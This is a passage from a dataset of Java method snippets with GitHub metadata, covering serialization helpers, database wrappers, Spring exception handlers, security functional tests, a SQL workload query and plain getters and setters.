"https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58693, "method_name": "unwrapListTag", "class_name": "ODS", "params": ["ListTag<Tag>"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<T>", "snippet": "    public static <T> List<T> unwrapListTag(ListTag<? extends Tag<T>> list){\n        List<T> output = new ArrayList<>();\n        for(Tag<?> tag : list.getValue()){\n            output.add(unwrap((Tag<T>) tag));\n        }\n        return output;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58694, "method_name": "serialize", "class_name": "ODS", "params": ["String", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "ObjectTag", "snippet": "    public static ObjectTag serialize(String key, Object obj){\n        ObjectTag objectTag = new ObjectTag(key);\n        try{\n            Class<?> clazz = obj.getClass();\n            objectTag.addTag(new StringTag(\"ODS_TAG\", clazz.getName()));\n            for(Field f : clazz.getDeclaredFields()){\n                if(f.getAnnotation(Serializable.class) == null) continue;\n                f.setAccessible(true);\n                objectTag.addTag(wrap(f.getName(), f.get(obj)));\n                f.setAccessible(false);\n            }\n        } catch(IllegalAccessException ex){\n            ex.printStackTrace();\n        }\n        if(objectTag.getValue().size() < 2)\n            throw new RuntimeException(\"Cannot serialize object: No serializable fields detected!\");\n        return objectTag;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58695, "method_name": "deserialize", "class_name": "ODS", "params": ["Tag<?>", "Class<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "T", "snippet": "    public static <T> T deserialize(Tag<?> tag, Class<T> mainClazz){\n        if(!(tag instanceof ObjectTag)) throw new RuntimeException(\"Cannot deserialize tag: Tag is not an ObjectTag!\");\n        ObjectTag objectTag = (ObjectTag) tag;\n        if(!objectTag.hasTag(\"ODS_TAG\"))\n            throw new RuntimeException(\"Cannot deserialize tag: This tag was not serialized!\");\n        Object obj;\n        try{\n             obj = mainClazz.getConstructor().newInstance();\n        }catch(Exception ex){\n            ex.printStackTrace();\n            return null;\n        }\n        for(Field f : mainClazz.getDeclaredFields()){\n            if(f.getAnnotation(Serializable.class) == null) continue;\n            try{\n                f.setAccessible(true);\n                f.set(obj, unwrap(objectTag.getTag(f.getName())));\n                f.setAccessible(false);\n            }catch(IllegalAccessException ex){\n                ex.printStackTrace();\n            }\n        }\n        return (T) obj;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58696, "method_name": "query", "class_name": "DatabaseOperator", "params": ["String", "ResultSetHandler<T>", "Object"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T query(final String baseQuery, final ResultSetHandler<T> resultHandler,\n      final Object... params)\n      throws SQLException {\n    try {\n      return this.queryRunner.query(baseQuery, resultHandler, params);\n    } catch (final SQLException ex) {\n      // todo kunkun-tang: Retry logics should be implemented here.\n      logger.error(\"query failed\", ex);\n      if (this.dbMetrics != null) {\n        this.dbMetrics.markDBFailQuery();\n      }\n      throw ex;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseOperator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58697, "method_name": "query", "class_name": "DatabaseOperator", "params": ["String", "ResultSetHandler<T>"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T query(final String baseQuery, final ResultSetHandler<T> resultHandler)\n          throws SQLException {\n    try {\n      return this.queryRunner.query(baseQuery, resultHandler);\n    } catch (final SQLException ex) {\n      // todo kunkun-tang: Retry logics should be implemented here.\n      logger.error(\"query failed\", ex);\n      if (this.dbMetrics != null) {\n        this.dbMetrics.markDBFailQuery();\n      }\n      throw ex;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseOperator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58698, "method_name": "transaction", "class_name": "DatabaseOperator", "params": ["SQLTransaction<T>"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T transaction(final SQLTransaction<T> operations) throws SQLException {\n    Connection conn = null;\n    try {\n      conn = this.queryRunner.getDataSource().getConnection();\n      conn.setAutoCommit(false);\n      final DatabaseTransOperator transOperator = new DatabaseTransOperator(this.queryRunner,\n          conn);\n      final T res = operations.execute(transOperator);\n      conn.commit();\n      return res;\n    } catch (final SQLException ex) {\n      // todo kunkun-tang: Retry logics should be implemented here.\n      logger.error(\"transaction failed\", ex);\n      if (this.dbMetrics != null) {\n        this.dbMetrics.markDBFailTransaction();\n      }\n      throw ex;\n    } finally {\n      DbUtils.closeQuietly(conn);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseOperator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58699, "method_name": "update", "class_name": "DatabaseOperator", "params": ["String", "Object"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int update(final String updateClause, final Object... params) throws SQLException {\n    try {\n      return this.queryRunner.update(updateClause, params);\n    } catch (final SQLException ex) {\n      // todo kunkun-tang: Retry logics should be implemented here.\n      logger.error(\"update failed\", ex);\n      if (this.dbMetrics != null) {\n        this.dbMetrics.markDBFailUpdate();\n      }\n      throw ex;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseOperator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58700, "method_name": "getDataSource", "class_name": "DatabaseOperator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AzkabanDataSource", "snippet": "  public AzkabanDataSource getDataSource() {\n    return (AzkabanDataSource) this.queryRunner.getDataSource();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseOperator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58701, "method_name": "applicationIsAbleToStart", "class_name": "SecurityFunctionalTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void applicationIsAbleToStart() {\n        webClient.get().uri(\"/api/version\")\n                .exchange()\n                .expectStatus().isOk()\n                .expectBody(String.class);\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/launcher/src/test/java/engineering/everest/lhotse/functionaltests/scenarios/SecurityFunctionalTests.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58702, "method_name": "swaggerApiDocIsAccessible", "class_name": "SecurityFunctionalTests", "params": [], "throws": ["IOException"], "modifiers": [], "return_type": "void", "snippet": "    void swaggerApiDocIsAccessible() throws IOException {\n        String apiContent = webClient.get().uri(swaggerApiDocPath + \"?group=internal\")\n                .exchange()\n                .expectStatus().isOk()\n                .returnResult(String.class).getResponseBody().blockFirst();\n\n        assertNotNull(apiContent);\n\n        Files.writeString(\n                Paths.get(System.getProperty(\"org.gradle.project.buildDir\"), \"web-app-api.json\"),\n                apiContent);\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/launcher/src/test/java/engineering/everest/lhotse/functionaltests/scenarios/SecurityFunctionalTests.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58703, "method_name": "retrievingOrganizationListWillFail_WhenUserIsNotAuthenticated", "class_name": "SecurityFunctionalTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void retrievingOrganizationListWillFail_WhenUserIsNotAuthenticated() {\n        webClient.get().uri(\"/api/admin/organization\")\n                .exchange()\n                .expectStatus().isUnauthorized();\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/launcher/src/test/java/engineering/everest/lhotse/functionaltests/scenarios/SecurityFunctionalTests.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58704, "method_name": "errorParameterHandler", "class_name": "ExceptionResolverContext", "params": ["ConstraintViolationException"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> errorParameterHandler(ConstraintViolationException e) {\n        StringBuilder message = new StringBuilder();\n        for (ConstraintViolation<?> c : e.getConstraintViolations()) {\n            message.append(c.getMessage());\n        }\n        Response<Object> response = new Response<>();\n        response.setCode(CodeConstant.PARAMETER_ERROR);\n        response.setMessage(message.toString());\n        return response;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58705, "method_name": "errorParameterHandler", "class_name": "ExceptionResolverContext", "params": ["MethodArgumentNotValidException"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> errorParameterHandler(MethodArgumentNotValidException e){\n        String message = e.getBindingResult().getFieldErrors().get(0).getDefaultMessage();\n        return new Response<>().errorResponse(CodeConstant.PARAMETER_ERROR, null , message);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58706, "method_name": "errorParameterHandler", "class_name": "ExceptionResolverContext", "params": ["BindingException"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> errorParameterHandler(BindingException e){\n        String message = e.getMessage();\n        return new Response<>().errorResponse(CodeConstant.PARAMETER_ERROR, null , message);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58707, "method_name": "errorParameterHandler", "class_name": "ExceptionResolverContext", "params": ["BindException"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> errorParameterHandler(BindException e){\n        String message = e.getAllErrors().get(0).getDefaultMessage();\n        return new Response<>().errorResponse(CodeConstant.PARAMETER_ERROR, null , message);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58708, "method_name": "endPointErrorHandler", "class_name": "ExceptionResolverContext", "params": ["EndPointException"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> endPointErrorHandler(EndPointException e){\n        String uiMessage = e.getUiMessage();\n        String message = this.informationSwitch(uiMessage);\n        if(e.getArgs() != null && e.getArgs().length > 0){\n            message = PatternInjectUtils.inject(message,e.getArgs());\n        }\n        return new Response<>().errorResponse(CodeConstant.SYS_ERROR, null, message);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58709, "method_name": "errorHandler", "class_name": "ExceptionResolverContext", "params": ["Exception"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> errorHandler(Exception e) {\n        LOG.error(\"SYSTEM_EXCEPTION, message: {}\", e.getMessage(), e);\n        return new Response<>().errorResponse(CodeConstant.SYS_ERROR, null,\n                \"\u7cfb\u7edf\u5904\u7406\u5f02\u5e38(System Exception)[\" + e.getMessage() + \"]\");\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58710, "method_name": "informationSwitch", "class_name": "ExceptionResolverContext", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String informationSwitch(String str){\n        Locale locale = LocaleContextHolder.getLocale();\n        try{\n            return messageSource.getMessage(str,null,locale);\n        }catch(NoSuchMessageException e){\n            return \"\u672a\u5b9a\u4e49\u5f02\u5e38(Undefined Exception)[\" + str + \"]\";\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58711, "method_name": "draw", "class_name": "SettingsPanel", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void draw(int mouseX, int mouseY, float partialTicks) {\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/SettingsPanel.java", "stars": "12", "class_props": {"extends": "Panel", "implements": null, "modifiers": ["public"]}}, {"id": 58712, "method_name": "onDraw", "class_name": "Practice02ClipPathView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        canvas.save();\n        canvas.clipPath(path1);\n        canvas.drawBitmap(bitmap, point1.x, point1.y, paint);\n        canvas.restore();\n\n        canvas.save();\n        canvas.clipPath(path2);\n        canvas.drawBitmap(bitmap, point2.x, point2.y, paint);\n        canvas.restore();\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson4/Practice02ClipPathView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 58713, "method_name": "getProcessList", "class_name": "GroupLoadDAO", "params": ["GroupLoadConfig", "Date", "Collection<Integer>", "Collection<Integer>", "String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "List<Object>", "snippet": "    public List<Object[]> getProcessList(GroupLoadConfig config, Date date, Collection<Integer> processTypeIds, Collection<Integer> groupIds, String sort)\n            throws Exception {\n\n        if (config == null) {\n            throw new IllegalArgumentException(\"config\");\n        }\n\n        if (date == null) {\n            throw new IllegalArgumentException(\"date\");\n        }\n\n        Parameter dateFromParam = ParameterCache.getParameter(config.getDateFromParamId());\n        Parameter dateToParam = config.getDateToParamId() <= 0 ? null : ParameterCache.getParameter(config.getDateToParamId());\n\n        List<Object[]> result = new ArrayList<>();\n\n        StringBuilder query = new StringBuilder(2000);\n        query.append(\n                \"SELECT DISTINCT SQL_CALC_FOUND_ROWS process.*, dateFromParam.value\");\n\n        if (dateToParam != null) {\n            query.append(\", dateToParam.value\");\n        }\n\n        query.append(\" FROM \" + TABLE_PROCESS + \"as process\");\n\n        if (groupIds != null && groupIds.size() > 0) {\n            query.append(\" LEFT JOIN \").append(TABLE_PROCESS_GROUP)\n                    .append(\" as process_group ON process_group.process_id=process.id\");\n        }\n\n        final String dateParamTable = Parameter.TYPE_DATETIME.equals(dateFromParam.getType()) ? Tables.TABLE_PARAM_DATETIME : Tables.TABLE_PARAM_DATE;\n\n        query.append(\" LEFT JOIN \" + dateParamTable + \" as dateFromParam ON dateFromParam.id=process.id AND dateFromParam.param_id=?\");\n\n        if (dateToParam != null) {\n            query.append(\" LEFT JOIN \" + dateParamTable + \" as dateToParam ON dateToParam.id=process.id AND dateToParam.param_id=?\");\n        }\n\n        query.append(\" WHERE 1=1\");\n\n        if (processTypeIds != null && processTypeIds.size() > 0) {\n            query.append(\" AND process.type_id IN (\");\n            query.append(Utils.toString(processTypeIds));\n            query.append(\") AND process.id>0\");\n        }\n\n        if (dateToParam != null) {\n            query.append(\" AND DATE(dateFromParam.value)<=?\");\n            query.append(\" AND DATE(dateToParam.value)>=?\");\n        } else {\n            query.append(\" AND DATE(dateFromParam.value)=?\");\n        }\n\n        if (groupIds != null && groupIds.size() > 0) {\n            query.append(\" AND process_group.group_id IN (\");\n            query.append(Utils.toString(groupIds));\n            query.append(\")\");\n        }\n\n        PreparedStatement ps = con.prepareStatement(query.toString());\n\n        if (dateToParam != null) {\n            ps.setInt(1, config.getDateFromParamId());\n            ps.setInt(2, config.getDateToParamId());\n\n            ps.setDate(3, TimeUtils.convertDateToSqlDate(date));\n            ps.setDate(4, TimeUtils.convertDateToSqlDate(date));\n        } else {\n            ps.setInt(1, config.getDateFromParamId());\n\n            ps.setDate(2, TimeUtils.convertDateToSqlDate(date));\n        }\n\n        final ParamValueDAO paramValueDao = new ParamValueDAO(con);\n\n        ResultSet rs = ps.executeQuery();\n        while (rs.next()) {\n            final Process process = getProcessFromRs(rs);\n\n            Object[] row = new Object[4];\n\n            row[0] = process;\n            row[1] = rs.getTimestamp(\"dateFromParam.value\");\n\n            if (dateToParam != null) {\n                row[2] = rs.getTimestamp(\"dateToParam.value\");\n            }\n\n            if (config.getAddressParamId() > 0) {\n                row[3] = paramValueDao.getParamAddress(process.getId(), config.getAddressParamId(), 1);\n            }\n\n            result.add(row);\n        }\n        rs.close();\n        ps.close();\n        \n        sortProcessList(result, sort);\n\n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/workload/dao/GroupLoadDAO.java", "stars": "12", "class_props": {"extends": "ProcessDAO", "implements": null, "modifiers": ["public"]}}, {"id": 58714, "method_name": "sortProcessList", "class_name": "GroupLoadDAO", "params": ["List<Object>", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void sortProcessList(List<Object[]> result, String sort) {\n\n        switch (Utils.maskNull(sort)) {\n\n        case \"time\":\n            Collections.sort(result, (o1, o2) -> {\n\n                final Process process1 = (Process) o1[0];\n                final Process process2 = (Process) o2[0];\n\n                int cmp = compareTime((Date) o1[1], (Date) o2[1]);\n                if (cmp != 0) {\n                    return cmp;\n                }\n\n                cmp = compareGroup(process1, process2);\n                if (cmp != 0) {\n                    return cmp;\n                }\n\n                return 0;\n            });\n\n            break;\n\n        case \"processType\":\n            Collections.sort(result, (o1, o2) -> {\n\n                final Process process1 = (Process) o1[0];\n                final Process process2 = (Process) o2[0];\n\n                int cmp = compareProcessType(process1, process2);\n                if (cmp != 0) {\n                    return cmp;\n                }\n\n                cmp = compareTime((Date) o1[1], (Date) o2[1]);\n                if (cmp != 0) {\n                    return cmp;\n                }\n\n                return 0;\n            });\n\n            break;\n\n        case \"userGroup\":\n        default:\n            Collections.sort(result, (o1, o2) -> {\n\n                final Process process1 = (Process) o1[0];\n                final Process process2 = (Process) o2[0];\n\n                int cmp = compareGroup(process1, process2);\n                if (cmp != 0) {\n                    return cmp;\n                }\n\n                cmp = compareTime((Date) o1[1], (Date) o2[1]);\n                if (cmp != 0) {\n                    return cmp;\n                }\n\n                return 0;\n            });\n\n            break;\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/workload/dao/GroupLoadDAO.java", "stars": "12", "class_props": {"extends": "ProcessDAO", "implements": null, "modifiers": ["public"]}}, {"id": 58715, "method_name": "compareGroup", "class_name": "GroupLoadDAO", "params": ["Process", "Process"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int compareGroup(final Process process1, final Process process2) {\n        if (process1.getGroupIds().equals(process2.getGroupIds())) {\n            return 0;\n        }\n\n        String title1 = process1.getGroupIds().stream().findAny().map(a -> UserCache.getUserGroup(a)).map(a -> a.getTitle()).orElse(\"\");\n        String title2 = process2.getGroupIds().stream().findAny().map(a -> UserCache.getUserGroup(a)).map(a -> a.getTitle()).orElse(\"\");\n\n        int cmp = title1.compareTo(title2);\n        if (cmp != 0) {\n            return cmp;\n        }\n\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/workload/dao/GroupLoadDAO.java", "stars": "12", "class_props": {"extends": "ProcessDAO", "implements": null, "modifiers": ["public"]}}, {"id": 58716, "method_name": "compareTime", "class_name": "GroupLoadDAO", "params": ["Date", "Date"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int compareTime(final Date date1, final Date date2) {\n        if (date1 == null) {\n            if (date2 == null) {\n                return 0;\n            } else {\n                return -1;\n            }\n        } else {\n            if (date2 == null) {\n                return 1;\n            } else {\n                return date1.compareTo(date2);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/workload/dao/GroupLoadDAO.java", "stars": "12", "class_props": {"extends": "ProcessDAO", "implements": null, "modifiers": ["public"]}}, {"id": 58717, "method_name": "compareProcessType", "class_name": "GroupLoadDAO", "params": ["Process", "Process"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int compareProcessType(final Process process1, final Process process2) {\n        if (process1.getTypeId() == process2.getTypeId()) {\n            return 0;\n        }\n\n        ProcessType processType1 = ProcessTypeCache.getProcessTypeSafe(process1.getTypeId());\n        ProcessType processType2 = ProcessTypeCache.getProcessTypeSafe(process2.getTypeId());\n\n        return processType1.getTitle().compareTo(processType2.getTitle());\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/workload/dao/GroupLoadDAO.java", "stars": "12", "class_props": {"extends": "ProcessDAO", "implements": null, "modifiers": ["public"]}}, {"id": 58718, "method_name": "getNumero", "class_name": "Encomenda", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getNumero() {\n        return numero;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 58719, "method_name": "setNumero", "class_name": "Encomenda", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNumero(int numero) {\n        this.numero = numero;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 58720, "method_name": "getProdutos", "class_name": "Encomenda", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Produto>", "snippet": "    public ArrayList<Produto> getProdutos() {\n        return Produtos;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 58721, "method_name": "setProdutos", "class_name": "Encomenda", "params": ["ArrayList<Produto>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProdutos(ArrayList<Produto> Produtos) {\n        this.Produtos = Produtos;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 58722, "method_name": "getData", "class_name": "Encomenda", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getData(){\n        return this.data;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 58723, "method_name": "setData", "class_name": "Encomenda", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setData(Date d){\n        this.data=d;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 58724, "method_name": "getCodigo_Cliente", "class_name": "Encomenda", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "   public int getCodigo_Cliente(){\n       return this.codigo_cliente;\n   }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 58725, "method_name": "setCodigo_Cliente", "class_name": "Encomenda", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "   public void setCodigo_Cliente(int cc){\n       this.codigo_cliente=cc;\n   }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 58726, "method_name": "totalEncomenda", "class_name": "Encomenda", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double totalEncomenda(){\n        double t=0;\n           for(Produto p: this.Produtos) t=t+p.getPreco();\n        return t;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 58727, "method_name": "verEncomenda", "class_name": "Encomenda", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void verEncomenda(){\n        System.out.println(\" Encomenda N\u00ba \"+this.numero+\" Cliente N\u00ba\"+this.codigo_cliente+\" Data \"+this.data);\n        System.out.println(\"Esta encomenda tem \"+this.Produtos.size()+\" produtos\");\n        System.out.println(\"========================== Listas de Produtos ===============================\");\n           for(Produto p: this.Produtos) p.imprimir();\n        System.out.println(\"=====================================\");\n        \n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 58728, "method_name": "adicionarProduto", "class_name": "Encomenda", "params": ["Produto"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void adicionarProduto(Produto p){\n        Produtos.add(p);  \n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 58729, "method_name": "removerProdutoEncomenda", "class_name": "Encomenda", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removerProdutoEncomenda( int cod){\n        \n        for(int i=0;i<Produtos.size();i++){\n            Produto p =Produtos.get(i);\n            if(p.getCodigo()==cod){\n                Produtos.remove(p); break;\n            }\n        }\n        \n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 58730, "method_name": "getAlias", "class_name": "PhonePoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getAlias()\n\t{\n\t\treturn alias;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58731, "method_name": "setAlias", "class_name": "PhonePoint", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setAlias( String alias )\n\t{\n\t\tthis.alias = alias;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58732, "method_name": "getComment", "class_name": "PhonePoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getComment()\n\t{\n\t\treturn comment;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58733, "method_name": "setComment", "class_name": "PhonePoint", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setComment( String comment )\n\t{\n\t\tthis.comment = comment;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58734, "method_name": "getDescription", "class_name": "PhonePoint", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getDescription()\n\t{\n\t\treturn description;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58735, "method_name": "setDescription", "class_name": "PhonePoint", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDescription( String description )\n\t{\n\t\tthis.description = description;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/phone/PhonePoint.java", "stars": 